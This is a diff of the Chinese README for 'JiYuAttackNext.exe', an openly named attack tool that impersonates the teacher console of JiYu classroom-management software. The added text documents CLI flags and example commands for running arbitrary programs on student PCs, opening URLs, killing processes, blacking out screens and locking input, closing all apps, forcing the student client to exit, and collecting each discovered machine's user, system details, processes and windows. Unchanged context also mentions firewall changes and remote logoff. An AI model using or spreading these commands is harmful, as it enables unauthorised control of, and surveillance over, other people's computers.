@@ -107,6 +107,30 @@ start /wait JiYuAttackNext.exe -ip 10.49.151.29 -msg "Hello"
 
 `-e break` 和 `-e continue` 会修改本机防火墙。EXE 默认以普通用户权限启动，普通命令直接在当前终端执行；只有这两项操作在未提升时会弹出 UAC，由隐藏的管理员助手完成修改后返回结果，不会另开一个显示输出的终端窗口。
 
+### 应用命令与教师端
+
+这些参数彼此互斥，也不能与 `-msg`、`--msg-file`、`-c`、`--file`、`-e` 同时使用；`-ip` 展开后的每个地址都会收到同一条命令。
+
+| 参数 | 类型 | 默认值 | 用途与说明 |
+| --- | --- | --- | --- |
+| `--run PATH` | 路径 | 无 | 在目标电脑上运行指定程序（应用命令 cmdId `0x0F`） |
+| `--run-args TEXT` | 字符串 | 空 | `--run` 的启动参数 |
+| `--run-show MODE` | `0`/`1`/`2` | `0` | `--run` 的窗口状态：正常、最小化、最大化 |
+| `--url URL` | 字符串 | 无 | 在目标电脑上打开网址（cmdId `0x18`）；缺协议时按 `http://` 补全 |
+| `--kill PID` | 整数 | 无 | 结束目标电脑上的指定进程，走 MESS 上报请求的进程号模式 |
+| `--blackscreen [SECONDS]` | 整数 | `10` | 让目标黑屏并按秒数自动解除；黑屏走会话频道组播 |
+| `--no-lock` | 开关 | 关 | `--blackscreen` 只黑屏，不锁定键盘与鼠标 |
+| `--blackout-text TEXT` | 字符串 | 空 | 黑屏期间显示的提示文字 |
+| `--unlock` | 开关 | 无 | 解除黑屏与键鼠锁，走会话频道组播 |
+| `--exit-student` | 开关 | 无 | 让目标电脑退出学生端（cmdId `0x15`） |
+| `--close-apps` | 开关 | 无 | 关闭目标电脑上的所有程序（cmdId `0x02`） |
+| `--channel N` | 整数 | `1` | 会话频道号，取值 1–32；黑屏、解锁与宣告都按该频道寻址 |
+| `--teacher-name NAME` | 字符串 | `1` | 宣告里携带的教师名，也是学生端屏幕上显示的名称 |
+| `--announce [SECONDS]` | 整数 | `10` | 发送教师端在线宣告并监听登录，超时后打印发现的路由信息 |
+| `--students [SECONDS]` | 整数 | `8` | 发现学生机后拉取并打印其系统信息、进程与窗口 |
+
+`--blackscreen` 与 `--unlock` 必须让 `--channel` 与学生端所在频道一致：这两条报文只在会话组播上被处理，单播不生效。锁键鼠的解除不能靠再发一次黑屏并把锁参数去掉，学生端只把 `lock_input=1` 当作上锁。
+
 ## 目标地址格式
 
 | 格式 | 参数示例 | 目标范围 |
@@ -256,6 +280,33 @@ CLI 模式按目标逐个启动本机 HTTP 文件服务，向目标发送随机�
 ```
 
 注销没有独立的极域报文，CLI 模式会通过 `-c` 相同的远程命令通道发送 `shutdown /l`；目标是否执行仍取决于学生端的远程命令能力。
+
+### 远程运行程序与打开网址
+
+```powershell
+JiYuAttackNext.exe -ip 10.49.151.29 --run "C:/Windows/System32/notepad.exe"
+JiYuAttackNext.exe -ip 10.49.151.1-10 --url example.com
+JiYuAttackNext.exe -ip 10.49.151.29 --run "C:/Program Files/App/app.exe" --run-args "--silent" --run-show 1
+```
+
+### 黑屏、解锁与退出学生端
+
+```powershell
+JiYuAttackNext.exe -ip 10.49.151.29 --blackscreen 30 --blackout-text "请回到座位"
+JiYuAttackNext.exe -ip 10.49.151.29 --blackscreen 60 --no-lock
+JiYuAttackNext.exe -ip 10.49.151.29 --unlock
+JiYuAttackNext.exe -ip 10.49.151.29 --exit-student
+JiYuAttackNext.exe -ip 10.49.151.29 --kill 4321
+```
+
+### 发现学生机
+
+```powershell
+JiYuAttackNext.exe --students 12
+JiYuAttackNext.exe --announce 15 --channel 2 --teacher-name "实验教师"
+```
+
+宣告不需要 `-ip`：报文发到会话组播地址，学生端收到后主动登录。发现阶段会先回会话应答与缩略图策略，再请求一次全量上报，因此终端里能直接看到计算机名、登录用户、系统、CPU、内存以及进程与窗口列表。没有任何学生登录时，命令会提示确认网段与频道是否一致。
 
 ## 行为与限制
 
